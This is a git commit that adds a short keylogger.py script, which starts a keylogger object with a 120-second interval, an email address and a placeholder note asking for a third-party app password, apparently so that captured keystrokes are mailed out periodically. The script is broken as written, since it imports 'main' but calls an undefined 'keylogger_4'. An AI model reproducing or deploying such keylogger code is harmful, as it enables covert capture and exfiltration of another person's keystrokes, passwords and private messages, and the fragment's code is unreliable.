85760d26d912931d8f0bf4b7f13245c898d0c4f0
Shreenath SP <87136956+shreenathsp@users.noreply.github.com>
2023-08-04 10:58:59 +0530

    Create keylogger.py

---
+++ keylogger.py
@@ -0,0 +1,4 @@
+import main
+
+my_keylogger = keylogger_4.Keylogger(120,"shreenath@gmail.com","USE YOUR #RD PARTY PASSWORD FOR THIS AS IT COULD NOT CREATE THIS YOUR NORMAL PASSWORD")
+my_keylogger.start()
